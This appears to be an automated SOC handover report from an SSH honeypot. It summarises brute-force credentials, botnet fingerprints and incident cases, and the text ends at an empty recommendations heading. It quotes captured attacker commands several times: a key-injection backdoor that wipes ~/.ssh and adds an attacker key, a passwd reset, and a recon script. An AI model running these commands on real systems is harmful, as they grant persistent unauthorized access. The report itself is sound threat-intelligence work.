# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-09-29 |
| **Generated At** | 2026-09-29T11:57:17Z |
| **Shift Time** | 11:57 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **119** |
| Confirmed Threats | **104** |
| False Positives Filtered | **15** (12.6%) |
| Unique Attacker IPs | **85** |
| Countries of Origin | **26** |
| High Severity Cases | **55** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **64** |
| Malware Samples Analyzed | **5** HIGH · **22** MED · 16 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **131** |
| Unique Credential Pairs | **78** |
| Unique Usernames | **27** |
| Unique Passwords | **58** |
| Successful Auth Pairs | **109** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 49 |
| `345gs5662d34` | 27 |
| `support` | 7 |
| `admin` | 6 |
| `admin123` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 28 |
| `345gs5662d34` | 27 |
| `support` | 7 |
| `admin` | 5 |
| `123` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 27 |
| `root` | `3245gs5662d34` | 12 |
| `support` | `support` | 7 |
| `admin` | `admin` | 4 |
| `root` | `123` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `1314520z` | `120.48.175.69` | 2026-09-29T06:55:33 |
| `345gs5662d34` | `345gs5662d34` | `120.48.175.69` | 2026-09-29T06:55:38 |
| `root` | `3245gs5662d34` | `120.48.175.69` | 2026-09-29T06:55:39 |
| `art` | `art` | `129.121.139.106` | 2026-09-29T06:58:30 |
| `345gs5662d34` | `345gs5662d34` | `129.121.139.106` | 2026-09-29T06:58:32 |
| `art` | `3245gs5662d34` | `129.121.139.106` | 2026-09-29T06:58:32 |
| `admin123` | `admin` | `192.210.254.249` | 2026-09-29T07:01:35 |
| `345gs5662d34` | `345gs5662d34` | `192.210.254.249` | 2026-09-29T07:01:38 |
| `admin123` | `3245gs5662d34` | `192.210.254.249` | 2026-09-29T07:01:38 |
| `root` | `darwin` | `159.65.5.51` | 2026-09-29T07:01:59 |
| `345gs5662d34` | `345gs5662d34` | `159.65.5.51` | 2026-09-29T07:02:04 |
| `root` | `3245gs5662d34` | `159.65.5.51` | 2026-09-29T07:02:05 |
| `zcx` | `123456` | `10.0.0.73` | 2026-09-29T07:05:13 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-09-29T07:05:16 |
| `zcx` | `3245gs5662d34` | `10.0.0.73` | 2026-09-29T07:05:18 |
| `root` | `123321..` | `10.0.0.73` | 2026-09-29T07:08:16 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-09-29T07:08:22 |
| `anton` | `1234` | `10.0.0.73` | 2026-09-29T07:10:57 |
| `anton` | `3245gs5662d34` | `10.0.0.73` | 2026-09-29T07:11:03 |
| `pi` | `starfish` | `121.167.171.219` | 2026-09-29T07:11:58 |
| `root` | `Abc123++` | `10.0.0.73` | 2026-09-29T07:16:53 |
| `root` | `P@55w0rd@2025` | `10.0.0.73` | 2026-09-29T07:18:20 |
| `server` | `12345678` | `10.0.0.73` | 2026-09-29T07:21:18 |
| `server` | `3245gs5662d34` | `10.0.0.73` | 2026-09-29T07:21:22 |
| `support` | `support` | `176.53.159.196` | 2026-09-29T07:27:36 |
| `root` | `server2` | `106.12.179.53` | 2026-09-29T07:55:30 |
| `admin` | `admin` | `10.0.0.73` | 2026-09-29T08:01:13 |
| `robert` | `trebor` | `58.221.60.25` | 2026-09-29T08:02:56 |
| `user1` | `Passw0rd` | `50.84.211.204` | 2026-09-29T08:09:13 |
| `345gs5662d34` | `345gs5662d34` | `50.84.211.204` | 2026-09-29T08:09:15 |
| `user1` | `3245gs5662d34` | `50.84.211.204` | 2026-09-29T08:09:15 |
| `root` | `P@ssw0rd123` | `94.154.43.69` | 2026-09-29T08:13:41 |
| `root` | `123` | `94.154.43.69` | 2026-09-29T08:14:00 |
| `root` | `Pi@12345678` | `168.76.131.178` | 2026-09-29T08:14:13 |
| `345gs5662d34` | `345gs5662d34` | `168.76.131.178` | 2026-09-29T08:14:17 |
| `root` | `3245gs5662d34` | `168.76.131.178` | 2026-09-29T08:14:19 |
| `mine` | `mine123` | `118.196.74.97` | 2026-09-29T08:15:53 |
| `345gs5662d34` | `345gs5662d34` | `118.196.74.97` | 2026-09-29T08:15:57 |
| `mine` | `3245gs5662d34` | `118.196.74.97` | 2026-09-29T08:15:59 |
| `sujan` | `sujan` | `14.36.171.104` | 2026-09-29T08:17:53 |
| `345gs5662d34` | `345gs5662d34` | `14.36.171.104` | 2026-09-29T08:17:56 |
| `sujan` | `3245gs5662d34` | `14.36.171.104` | 2026-09-29T08:17:58 |
| `bsc` | `bsc` | `10.0.0.73` | 2026-09-29T08:22:51 |
| `bsc` | `3245gs5662d34` | `10.0.0.73` | 2026-09-29T08:22:57 |
| `deploy` | `deploy2022` | `10.0.0.73` | 2026-09-29T08:24:43 |
| `deploy` | `3245gs5662d34` | `10.0.0.73` | 2026-09-29T08:24:50 |
| `apple` | `apple` | `58.221.60.25` | 2026-09-29T08:27:28 |
| `support` | `support` | `10.0.0.73` | 2026-09-29T08:42:55 |
| `hikvision` | `hikvision` | `195.178.110.204` | 2026-09-29T08:50:21 |
| `root` | `000000` | `193.32.162.84` | 2026-09-29T09:08:49 |
| `root` | `111111` | `193.32.162.84` | 2026-09-29T09:12:00 |
| `root` | `123` | `193.32.162.84` | 2026-09-29T09:14:50 |
| `admin` | `admin` | `77.90.185.17` | 2026-09-29T09:15:46 |
| `root` | `123123` | `193.32.162.84` | 2026-09-29T09:17:51 |
| `root` | `123321` | `193.32.162.84` | 2026-09-29T09:20:22 |
| `arcadia` | `arcadia` | `115.190.197.74` | 2026-09-29T09:22:07 |
| `345gs5662d34` | `345gs5662d34` | `115.190.197.74` | 2026-09-29T09:22:11 |
| `arcadia` | `3245gs5662d34` | `115.190.197.74` | 2026-09-29T09:22:12 |
| `root` | `1234` | `193.32.162.84` | 2026-09-29T09:22:46 |
| `root` | `Ljy123456` | `107.150.105.10` | 2026-09-29T09:23:04 |
| `345gs5662d34` | `345gs5662d34` | `107.150.105.10` | 2026-09-29T09:23:06 |
| `root` | `3245gs5662d34` | `107.150.105.10` | 2026-09-29T09:23:07 |
| `root` | `12345` | `193.32.162.84` | 2026-09-29T09:25:19 |
| `root` | `1234567` | `193.32.162.84` | 2026-09-29T09:29:11 |
| `root` | `Zz@123123` | `45.78.202.217` | 2026-09-29T09:30:07 |
| `345gs5662d34` | `345gs5662d34` | `45.78.202.217` | 2026-09-29T09:30:12 |
| `root` | `3245gs5662d34` | `45.78.202.217` | 2026-09-29T09:30:14 |
| `root` | `12345678` | `193.32.162.84` | 2026-09-29T09:30:53 |
| `root` | `123456789` | `193.32.162.84` | 2026-09-29T09:32:48 |
| `telecomadmin` | `admintelecom` | `80.94.95.118` | 2026-09-29T09:34:05 |
| `root` | `1234567890` | `193.32.162.84` | 2026-09-29T09:34:35 |
| `root` | `123456a` | `193.32.162.84` | 2026-09-29T09:36:19 |
| `root` | `123456b` | `193.32.162.84` | 2026-09-29T09:38:03 |
| `root` | `123abc` | `193.32.162.84` | 2026-09-29T09:46:13 |
| `root` | `fast` | `58.221.60.25` | 2026-09-29T09:47:10 |
| `root` | `3245gs5662d34` | `58.221.60.25` | 2026-09-29T09:47:46 |
| `root` | `123qwe` | `193.32.162.84` | 2026-09-29T09:48:03 |
| `root` | `1q2w3e4r` | `193.32.162.84` | 2026-09-29T09:49:44 |
| `root` | `555555` | `193.32.162.84` | 2026-09-29T09:51:28 |
| `admin123` | `admin123` | `10.0.0.73` | 2026-09-29T10:02:14 |
| `usertest` | `usertest` | `10.0.0.73` | 2026-09-29T10:07:34 |
| `usertest` | `3245gs5662d34` | `10.0.0.73` | 2026-09-29T10:07:38 |
| `ubuntu` | `abcd1234` | `10.0.0.73` | 2026-09-29T10:07:54 |
| `admin123` | `admin123` | `80.94.95.118` | 2026-09-29T10:11:35 |
| `admin123` | `admin123` | `77.90.185.17` | 2026-09-29T10:12:10 |
| `root` | `` | `89.87.252.151` | 2026-09-29T10:12:44 |
| `user` | `Passw0rd2024` | `218.90.33.83` | 2026-09-29T10:26:17 |
| `root` | `Hf123456!` | `43.135.154.242` | 2026-09-29T10:26:35 |
| `345gs5662d34` | `345gs5662d34` | `43.135.154.242` | 2026-09-29T10:26:37 |
| `root` | `3245gs5662d34` | `43.135.154.242` | 2026-09-29T10:26:38 |
| `rootadmin` | `P@ssw0rd` | `59.16.212.232` | 2026-09-29T10:27:26 |
| `345gs5662d34` | `345gs5662d34` | `59.16.212.232` | 2026-09-29T10:27:30 |
| `rootadmin` | `3245gs5662d34` | `59.16.212.232` | 2026-09-29T10:27:31 |
| `work` | `root` | `179.32.213.29` | 2026-09-29T10:30:12 |
| `345gs5662d34` | `345gs5662d34` | `179.32.213.29` | 2026-09-29T10:30:14 |
| `work` | `3245gs5662d34` | `179.32.213.29` | 2026-09-29T10:30:15 |
| `admin` | `adm1n` | `182.61.33.68` | 2026-09-29T10:31:13 |
| `admin` | `3245gs5662d34` | `182.61.33.68` | 2026-09-29T10:31:44 |
| `root` | `P@ssw0rd89` | `181.62.56.67` | 2026-09-29T10:33:11 |
| `root` | `P@55w0rd!` | `43.133.61.254` | 2026-09-29T10:36:34 |
| `345gs5662d34` | `345gs5662d34` | `43.133.61.254` | 2026-09-29T10:36:38 |
| `root` | `3245gs5662d34` | `43.133.61.254` | 2026-09-29T10:36:39 |
| `root` | `P@55w0rd!` | `187.141.71.166` | 2026-09-29T10:37:02 |
| `345gs5662d34` | `345gs5662d34` | `187.141.71.166` | 2026-09-29T10:37:05 |
| `root` | `3245gs5662d34` | `187.141.71.166` | 2026-09-29T10:37:05 |
| `gitlab` | `1` | `20.106.202.68` | 2026-09-29T10:39:44 |
| `345gs5662d34` | `345gs5662d34` | `20.106.202.68` | 2026-09-29T10:39:45 |
| `gitlab` | `3245gs5662d34` | `20.106.202.68` | 2026-09-29T10:39:45 |
| `cod` | `cod` | `125.88.225.11` | 2026-09-29T10:39:54 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **119** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 52 |
| OpenSSH | 7 |
| Go SSH scanner | 6 |
| Paramiko (Python) | 3 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 43 | 24 |
| `03a80b21afa8...` | Modern SSH client | 5 | 2 |
| `390ffe68a68c...` | Modern SSH client | 4 | 2 |
| `eff4c24daffc...` | Modern SSH client | 3 | 1 |
| `a704be057881...` | Mirai/variant | 3 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 43 | 24 | Mirai/variant |
| `03a80b21afa8...` | libssh | 5 | 2 | Modern SSH client |
| `95420f9d932d...` | libssh | 4 | 4 | — |
| `390ffe68a68c...` | OpenSSH | 4 | 2 | Modern SSH client |
| `eff4c24daffc...` | Go SSH scanner | 3 | 1 | Modern SSH client |
| `a704be057881...` | Paramiko (Python) | 3 | 2 | Mirai/variant |
| `bc9e7273cde2...` | OpenSSH | 2 | 2 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 2 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **7** |
| Campaign Clusters | **5** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 17 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 17 | 17 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 1 | `T1105, T1070, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 1 | `T1105, T1140, T1059.004` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "cod\njUWK355twEp6\njUWK355twEp6"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `125.88.225.11`, `181.62.56.67`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `193.32.162.84`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `120.48.175.69`, `118.196.74.97`, `107.150.105.10`, `192.210.254.249`, `59.16.212.232`, `20.106.202.68`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **85** |
| Unique ASNs | **44** |
| High-Risk ASNs | **33** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 32 | HIGH |
| `AS25369` | Hydra Communications Ltd | 4 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 2 | HIGH |
| `AS31898` | Oracle Corporation | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (53)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-45f6a3d8b502

| Field | Detail |
|---|---|
| **Source IP** | `120.48.175[.]69` |
| **First Seen** | 2026-09-29 06:55 |
| **Last Seen** | 2026-09-29 06:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 06:55:32` | `cowrie.session.connect` |
| `2026-09-29 06:55:32` | `cowrie.client.version` |
| `2026-09-29 06:55:32` | `cowrie.client.kex` |
| `2026-09-29 06:55:33` | `cowrie.login.success` |
| `2026-09-29 06:55:34` | `cowrie.session.params` |
| `2026-09-29 06:55:34` | `cowrie.command.input` |
| `2026-09-29 06:55:34` | `cowrie.command.failed` |
| `2026-09-29 06:55:34` | `cowrie.log.closed` |
| `2026-09-29 06:55:35` | `cowrie.session.params` |
| `2026-09-29 06:55:35` | `cowrie.command.input` |
| `2026-09-29 06:55:35` | `cowrie.session.file_download` |
| `2026-09-29 06:55:35` | `cowrie.log.closed` |
| `2026-09-29 06:55:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.175[.]69` to AbuseIPDB if not already reported
- [ ] Block `120.48.175[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21e82bb9f566

| Field | Detail |
|---|---|
| **Source IP** | `120.48.175[.]69` |
| **First Seen** | 2026-09-29 06:55 |
| **Last Seen** | 2026-09-29 06:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 06:55:36` | `cowrie.session.connect` |
| `2026-09-29 06:55:36` | `cowrie.client.version` |
| `2026-09-29 06:55:37` | `cowrie.client.kex` |
| `2026-09-29 06:55:38` | `cowrie.login.success` |
| `2026-09-29 06:55:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.175[.]69` to AbuseIPDB if not already reported
- [ ] Block `120.48.175[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61faa87a3120

| Field | Detail |
|---|---|
| **Source IP** | `129.121.139[.]106` |
| **First Seen** | 2026-09-29 06:58 |
| **Last Seen** | 2026-09-29 06:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 06:58:30` | `cowrie.session.connect` |
| `2026-09-29 06:58:30` | `cowrie.client.version` |
| `2026-09-29 06:58:30` | `cowrie.client.kex` |
| `2026-09-29 06:58:30` | `cowrie.login.success` |
| `2026-09-29 06:58:31` | `cowrie.session.params` |
| `2026-09-29 06:58:31` | `cowrie.command.input` |
| `2026-09-29 06:58:31` | `cowrie.command.failed` |
| `2026-09-29 06:58:31` | `cowrie.log.closed` |
| `2026-09-29 06:58:32` | `cowrie.session.params` |
| `2026-09-29 06:58:32` | `cowrie.command.input` |
| `2026-09-29 06:58:32` | `cowrie.session.file_download` |
| `2026-09-29 06:58:32` | `cowrie.log.closed` |
| `2026-09-29 06:58:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.139[.]106` to AbuseIPDB if not already reported
- [ ] Block `129.121.139[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d923d7ee3052

| Field | Detail |
|---|---|
| **Source IP** | `129.121.139[.]106` |
| **First Seen** | 2026-09-29 06:58 |
| **Last Seen** | 2026-09-29 06:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 06:58:32` | `cowrie.session.connect` |
| `2026-09-29 06:58:32` | `cowrie.client.version` |
| `2026-09-29 06:58:32` | `cowrie.client.kex` |
| `2026-09-29 06:58:32` | `cowrie.login.success` |
| `2026-09-29 06:58:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.139[.]106` to AbuseIPDB if not already reported
- [ ] Block `129.121.139[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-877ae46d5dfd

| Field | Detail |
|---|---|
| **Source IP** | `192.210.254[.]249` |
| **First Seen** | 2026-09-29 07:01 |
| **Last Seen** | 2026-09-29 07:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 07:01:35` | `cowrie.session.connect` |
| `2026-09-29 07:01:35` | `cowrie.client.version` |
| `2026-09-29 07:01:35` | `cowrie.client.kex` |
| `2026-09-29 07:01:35` | `cowrie.login.success` |
| `2026-09-29 07:01:36` | `cowrie.session.params` |
| `2026-09-29 07:01:36` | `cowrie.command.input` |
| `2026-09-29 07:01:36` | `cowrie.command.failed` |
| `2026-09-29 07:01:36` | `cowrie.log.closed` |
| `2026-09-29 07:01:37` | `cowrie.session.params` |
| `2026-09-29 07:01:37` | `cowrie.command.input` |
| `2026-09-29 07:01:37` | `cowrie.session.file_download` |
| `2026-09-29 07:01:37` | `cowrie.log.closed` |
| `2026-09-29 07:01:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.210.254[.]249` to AbuseIPDB if not already reported
- [ ] Block `192.210.254[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0972ec461c3

| Field | Detail |
|---|---|
| **Source IP** | `192.210.254[.]249` |
| **First Seen** | 2026-09-29 07:01 |
| **Last Seen** | 2026-09-29 07:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 07:01:37` | `cowrie.session.connect` |
| `2026-09-29 07:01:37` | `cowrie.client.version` |
| `2026-09-29 07:01:37` | `cowrie.client.kex` |
| `2026-09-29 07:01:38` | `cowrie.login.success` |
| `2026-09-29 07:01:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.210.254[.]249` to AbuseIPDB if not already reported
- [ ] Block `192.210.254[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7491f43fa71f

| Field | Detail |
|---|---|
| **Source IP** | `159.65.5[.]51` |
| **First Seen** | 2026-09-29 07:01 |
| **Last Seen** | 2026-09-29 07:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 07:01:58` | `cowrie.session.connect` |
| `2026-09-29 07:01:58` | `cowrie.client.version` |
| `2026-09-29 07:01:58` | `cowrie.client.kex` |
| `2026-09-29 07:01:59` | `cowrie.login.success` |
| `2026-09-29 07:02:00` | `cowrie.session.params` |
| `2026-09-29 07:02:00` | `cowrie.command.input` |
| `2026-09-29 07:02:00` | `cowrie.command.failed` |
| `2026-09-29 07:02:01` | `cowrie.log.closed` |
| `2026-09-29 07:02:02` | `cowrie.session.params` |
| `2026-09-29 07:02:02` | `cowrie.command.input` |
| `2026-09-29 07:02:02` | `cowrie.session.file_download` |
| `2026-09-29 07:02:02` | `cowrie.log.closed` |
| `2026-09-29 07:02:06` | `cowrie.session.closed` |

**Recommended Actions:**
